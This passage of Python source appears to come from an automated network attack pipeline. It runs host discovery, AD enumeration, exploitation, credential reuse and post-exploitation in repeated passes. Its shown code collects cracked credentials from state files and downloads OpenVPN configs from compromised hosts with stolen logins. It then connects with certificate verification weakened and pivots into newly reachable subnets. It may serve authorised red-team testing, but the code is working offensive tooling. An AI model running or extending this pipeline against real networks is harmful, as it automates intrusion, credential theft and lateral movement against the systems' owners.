    patched_text = patched_text.replace("remote-cert-tls server", "# remote-cert-tls server")
    patched_ovpn.write_text(patched_text)
    cmd = ["openvpn", "--config", str(patched_ovpn)]

    # Re-add the pull filters on the patched config
    if "redirect-gateway" in ovpn_text:
        info("Config contains redirect-gateway — adding --pull-filter to ignore it")
        cmd += ["--pull-filter", "ignore", "redirect-gateway"]
    cmd += ["--pull-filter", "ignore", "dhcp-option"]
    cmd += ["--pull-filter", "ignore", "block-outside-dns"]
    cmd += ["--tls-cert-profile", "insecure"]

    log_path = STATE_DIR / "vpn_pivot" / "openvpn.log"
    try:
        _VPN_PROCESS = subprocess.Popen(
            cmd + ["--daemon", "--log", str(log_path),
                   "--writepid", str(STATE_DIR / "vpn_pivot" / "openvpn.pid")],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except FileNotFoundError:
        err("openvpn binary not found in PATH")
        return False
    except Exception as exc:
        err(f"Failed to start OpenVPN: {exc}")
        return False

    # Wait for a tun/tap interface to appear on Kali
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        time.sleep(3)
        # Check if openvpn is still running
        if _VPN_PROCESS.poll() is not None:
            err(f"OpenVPN process exited with code {_VPN_PROCESS.returncode}")
            break
        try:
            out = subprocess.check_output(
                ["ip", "-o", "link", "show", "type", "tun"],
                text=True, timeout=5, stderr=subprocess.DEVNULL,
            )
            if out.strip():
                ok("VPN tunnel established (tun interface detected)")
                tlog("pivot", "OpenVPN tunnel up", "success")
                # Give routes a moment to propagate
                time.sleep(3)
                return True
        except Exception:
            # Fallback: check ip link show for tun/tap
            try:
                out2 = subprocess.check_output(["ip", "link", "show"], text=True, timeout=5)
                for line in out2.splitlines():
                    if "tun" in line or "tap" in line:
                        ok("VPN tunnel established (tun/tap interface detected)")
                        tlog("pivot", "OpenVPN tunnel up", "success")
                        time.sleep(3)
                        return True
            except Exception:
                pass

    err(f"OpenVPN did not establish tunnel within {timeout}s")
    # Dump the last 20 lines of the log for debugging
    if log_path.exists():
        tail = log_path.read_text(errors="replace").splitlines()[-20:]
        for line in tail:
            info(f"  openvpn: {line}")
    tlog("pivot", "OpenVPN tunnel failed", "error")
    return False


def _get_new_routes_after_vpn(known_cidrs: set[str]) -> set[str]:
    """
    After VPN connects, read `ip route` on Kali to find newly pushed routes
    that we haven't scanned yet.  Returns set of CIDR strings.
    """
    new_cidrs: set[str] = set()
    try:
        out = subprocess.check_output(["ip", "route", "show"], text=True, timeout=5)
    except Exception:
        return new_cidrs

    cidr_re = re.compile(r"^(\d{1,3}(?:\.\d{1,3}){3}/\d{1,2})\b")
    for line in out.splitlines():
        m = cidr_re.match(line.strip())
        if not m:
            continue
        cidr_str = m.group(1)
        try:
            net = ipaddress.IPv4Network(cidr_str, strict=False)
        except ValueError:
            continue
        if net.is_loopback or net.is_link_local or net.is_multicast:
            continue
        if net.prefixlen >= 32 or net.prefixlen < 8:
            continue
        normalized = str(net)
        if normalized not in known_cidrs:
            new_cidrs.add(normalized)
            info(f"New route from VPN: {normalized}")

    return new_cidrs


def _attempt_vpn_pivot(
    postex_data: dict, known_cidrs: set[str], dry_run: bool
) -> set[str]:
    """
    End-to-end VPN pivot:
      1. Scan post-ex output for .ovpn paths
      2. Download the config + certs via SFTP
      3. Connect OpenVPN
      4. Read new routes from Kali's routing table
    Returns set of new CIDR strings to scan.
    """
    ovpn_entries = _find_ovpn_paths(postex_data)
    if not ovpn_entries:
        return set()

    if dry_run:
        new_cidrs: set[str] = set()
        for host_ip, ovpn_path, _, _ in ovpn_entries:
            warn(f"[DRY-RUN] Would download {ovpn_path} from {host_ip} and connect VPN")
            tlog("pivot", f"DRY-RUN: VPN pivot via {host_ip}:{ovpn_path}", "dry_run")
        return new_cidrs

    # Try each discovered .ovpn until one connects
    for host_ip, ovpn_remote, username, password in ovpn_entries:
        tlog("pivot", f"Attempting VPN pivot via {host_ip}: {ovpn_remote}", "attempt")

        local_ovpn = _download_ovpn_files(host_ip, ovpn_remote, username, password)
        if not local_ovpn:
            continue

        # Fix incomplete CA chain by fetching the server's full CA file
        _fix_ca_chain(local_ovpn, host_ip, username, password)

        if _connect_vpn(local_ovpn):
            new_routes = _get_new_routes_after_vpn(known_cidrs)
            if new_routes:
                return new_routes
            else:
                warn("VPN connected but no new routes found — check server push config")
                return set()

    warn("All VPN pivot attempts failed")
    return set()


def _snapshot_credentials() -> frozenset[tuple[str, str]]:
    """
    Collect all (username, password) pairs across every state file.
    Returns a frozenset for stable comparison between iterations.
    """
    pairs: set[tuple[str, str]] = set()
    for key in ("ad_findings", "exploitation", "lateral"):
        data = _load_json(STATE_FILES[key])
        if not data:
            continue
        for c in data.get("cracked_credentials", []):
            pairs.add((c.get("username", ""), c.get("password", "")))
        for r in data.get("results", []):
            for c in r.get("credentials_recovered", []):
                pairs.add((c.get("username", ""), c.get("password", "")))
        for e in data.get("reuse_events", []):
            cred = e.get("credential", {})
            pairs.add((cred.get("username", ""), cred.get("password", "")))
    return frozenset(pairs)


def _snapshot_hosts() -> frozenset[str]:
    """Return all host IPs seen across discovery and services state files."""
    ips: set[str] = set()
    for key in ("discovery", "services"):
        data = _load_json(STATE_FILES[key])
        if not data:
            continue
        for h in data.get("hosts", []):
            ip = h.get("ip")
            if ip:
                ips.add(ip)
    return frozenset(ips)


def _merge_discovery(new_cidr: str) -> None:
    """
    Merge a new CIDR's discovery results into the existing discovery.json so
    subsequent stages see all hosts regardless of which iteration found them.
    """
    existing = _load_json(STATE_FILES["discovery"]) or {"hosts": []}
    new_data  = _load_json(STATE_DIR / "discovery_pivot.json") or {"hosts": []}

    existing_ips = {h["ip"] for h in existing.get("hosts", [])}
    added = 0
    for h in new_data.get("hosts", []):
        if h["ip"] not in existing_ips:
            existing["hosts"].append(h)
            existing_ips.add(h["ip"])
            added += 1

    if added:
        _atomic_write(STATE_FILES["discovery"], existing)
        ok(f"Merged {added} new host(s) from pivot CIDR {new_cidr} into discovery.json")


# ---------------------------------------------------------------------------
# Single pipeline pass (stages 1-7 for one CIDR)
# ---------------------------------------------------------------------------

def _run_pass(cidr: str, lhost: str, args: argparse.Namespace,
              iteration: int, pivot: bool = False) -> None:
    """
    Execute stages 1–7 for the given CIDR.
    When pivot=True the discovery output is written to discovery_pivot.json
    so it can be merged without overwriting the primary run.
    """
    tag = f"iter{iteration}"
    resume = args.resume and iteration == 1  # only honour --resume on first pass

    # Stages 1 & 2 always re-run for each new CIDR (no checkpoint skip on pivots)
    def run_discovery():
        from modules import discovery  # type: ignore
        result = discovery.run(cidr)
        if pivot:
            # Save pivot-specific copy for merging
            _atomic_write(STATE_DIR / "discovery_pivot.json",
                          _load_json(STATE_FILES["discovery"]) or {})

    _run_stage(f"Host Discovery [{tag}]", "discovery", run_discovery, resume)

    if pivot:
        _merge_discovery(cidr)

    def run_enrichment():
        from modules import enrichment  # type: ignore
        enrichment.run()

    _run_stage(f"Service Enrichment [{tag}]", "services", run_enrichment, resume)

    def run_ad_enum():
        from modules import ad_enum  # type: ignore
        ad_enum.run()

    _run_stage(
        f"AD Enumeration [{tag}]", "ad_findings", run_ad_enum,
        resume, skip=args.skip_ad,
    )

    def run_planner():
        from modules import planner  # type: ignore
        planner.run()

    _run_stage(f"Attack Planning [{tag}]", "attack_plan", run_planner, resume)

    # Stage 5
    attack_plan = _load_json(STATE_FILES["attack_plan"]) or {"attack_paths": []}
    banner_stage(5, f"Exploitation [{tag}]")
    tlog("exploitation", f"Stage started [{tag}]", "start")
    if not (resume and STATE_FILES["exploitation"].exists()):
        t0 = time.monotonic()
        try:
            run_exploits(attack_plan, lhost, DRY_RUN)
            elapsed = time.monotonic() - t0
            ok(f"Exploitation completed in {elapsed:.1f}s")
            tlog("exploitation", f"Stage completed in {elapsed:.1f}s", "success")
        except Exception as exc:
            err(f"Exploitation failed: {exc}")
            tlog("exploitation", f"Stage failed: {exc}", "error")

    def run_reuse():
        from modules import reuse  # type: ignore
        reuse.run()

    _run_stage(f"Credential Reuse [{tag}]", "lateral", run_reuse, resume)

    def run_postex():
        from modules import postex  # type: ignore
        postex.run()

    _run_stage(
        f"Post-Exploitation [{tag}]", "postex", run_postex,
        resume, skip=args.skip_postex,
    )


# ---------------------------------------------------------------------------
# Main pipeline — iterative loop
# ---------------------------------------------------------------------------
def main() -> None:
    global DRY_RUN

    args = parse_args()
    DRY_RUN = args.dry_run

    # Resolve target CIDR
    if args.auto:
        cidr = detect_local_cidr()
    else:
        cidr = args.target

    STATE_DIR.mkdir(parents=True, exist_ok=True)
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

    if str(BASE_DIR) not in sys.path:
        sys.path.insert(0, str(BASE_DIR))

    print_banner(cidr)
    tlog("orchestrator", f"Pipeline started — target: {cidr}", "start")

    lhost = detect_lhost(cidr)
    info(f"LHOST (outbound interface): {lhost}")

    # ── Iterative loop ────────────────────────────────────────────────────────
    #
    # Each iteration:
    #   1. Run stages 1-7 against pending CIDRs
    #   2. After post-ex, extract new subnets from arp/route/ipconfig output
    #   3. Compare credential snapshot — new creds trigger a reuse sweep
    #   4. Stop when: no new hosts found, no new subnets, no new creds,
    #                 or max_iterations reached
    #
    known_cidrs:  set[str]   = {cidr}
    pending_cidrs: list[str] = [cidr]
    cred_snapshot = frozenset()
    host_snapshot = frozenset()
    iteration = 0

    while pending_cidrs and iteration < args.max_iterations:
        iteration += 1
        current_cidr = pending_cidrs.pop(0)
        pivot = (iteration > 1)

        bar = "═" * 62
        print(f"\n{CYAN}{bar}{RESET}")
        print(f"{BOLD}{CYAN}  ITERATION {iteration}/{args.max_iterations}"
              f"  —  target: {current_cidr}"
              f"{'  [PIVOT]' if pivot else ''}{RESET}")
        print(f"{CYAN}{bar}{RESET}\n")
        tlog("orchestrator", f"Iteration {iteration} — CIDR: {current_cidr}", "start")

        _run_pass(current_cidr, lhost, args, iteration, pivot=pivot)

        # ── What did we gain? ──────────────────────────────────────────────
        new_host_snapshot = _snapshot_hosts()
        new_cred_snapshot = _snapshot_credentials()

        new_hosts = new_host_snapshot - host_snapshot
        new_creds = new_cred_snapshot - cred_snapshot

        if new_hosts:
            ok(f"Iteration {iteration}: {len(new_hosts)} new host(s) discovered")
        if new_creds:
            ok(f"Iteration {iteration}: {len(new_creds)} new credential(s) recovered")

        host_snapshot = new_host_snapshot
        cred_snapshot = new_cred_snapshot

        # ── VPN pivot: download .ovpn from compromised hosts, connect ─────
        postex_data = _load_json(STATE_FILES["postex"]) or {}
        vpn_subnets = _attempt_vpn_pivot(postex_data, known_cidrs, DRY_RUN)

        for subnet in sorted(vpn_subnets):
            warn(f"VPN pivot opened new subnet: {subnet}")
            tlog("orchestrator", f"VPN pivot subnet: {subnet}", "pivot")
            known_cidrs.add(subnet)
            pending_cidrs.append(subnet)

        # ── Extract pivot subnets from post-ex output (route/addr parsing) ──
        pivot_subnets = _extract_pivot_subnets(postex_data, known_cidrs)

        for subnet in sorted(pivot_subnets):
            warn(f"Pivot target discovered: {subnet}")
            tlog("orchestrator", f"New pivot subnet: {subnet}", "pivot")
            known_cidrs.add(subnet)
            pending_cidrs.append(subnet)

        # ── Convergence check ──────────────────────────────────────────────
        if not vpn_subnets and not pivot_subnets and not new_hosts and not new_creds:
            ok(f"No new attack surface found after iteration {iteration} — converged.")
            tlog("orchestrator", "Pipeline converged — no new surface", "converged")
            break

    if iteration >= args.max_iterations and pending_cidrs:
        warn(f"Reached --max-iterations={args.max_iterations} with {len(pending_cidrs)}"
             f" subnet(s) unexplored: {pending_cidrs}")
        warn("Re-run with --max-iterations N to continue.")

    # ── Stage 8: Report (once, after all iterations) ───────────────────────
    def run_report():
        from modules import report  # type: ignore
        report.run()

    _run_stage("Report Generation", "report", run_report, False)

    # ── Summary ────────────────────────────────────────────────────────────
    bar = "═" * 62
    print(f"\n{GREEN}{bar}{RESET}")
    print(f"{BOLD}{GREEN}  Pipeline complete — {iteration} iteration(s).{RESET}")
    print(f"  Subnets scanned : {_c(WHITE, ', '.join(sorted(known_cidrs)))}")
    final_creds = _snapshot_credentials()
    print(f"  Credentials held: {_c(WHITE, str(len(final_creds)))}")
    final_hosts = _snapshot_hosts()
    print(f"  Hosts seen      : {_c(WHITE, str(len(final_hosts)))}")

    report_files = sorted(OUTPUT_DIR.glob("report_*.html"))
    if report_files:
        ok(f"Report: {report_files[-1]}")

    print(f"{GREEN}{bar}{RESET}\n")
    tlog("orchestrator", f"Pipeline finished — {iteration} iteration(s)", "done")


if __name__ == "__main__":
    main()
